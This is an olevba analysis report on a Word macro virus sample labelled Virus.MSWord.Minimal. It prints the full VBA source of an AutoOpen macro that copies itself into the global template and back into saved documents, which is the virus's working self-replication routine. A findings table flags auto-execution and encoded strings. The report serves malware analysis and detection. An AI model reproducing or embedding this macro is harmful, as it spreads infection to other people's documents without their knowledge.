olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.fa-5c4dea34f3f84db0965e269d85d7146a0ec10b79
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.fa-5c4dea34f3f84db0965e269d85d7146a0ec10b79 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUtOoPeN.bas 
in file: Virus.MSWord.Minimal.fa-5c4dea34f3f84db0965e269d85d7146a0ec10b79 - OLE stream: 'Macros/VBA/aUtOoPeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
On Error GoTo -1: On Error GoTo Q: a$ = WordBasic.[FileName$]() + ":aUtOoPeN"
b$ = "Global:AuToOpEn": WordBasic.MacroCopy a$, b$
Q: On Error GoTo -1: On Error GoTo R: WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy b$, a$
R: 'Q[NJ]
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUtOoPeN            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

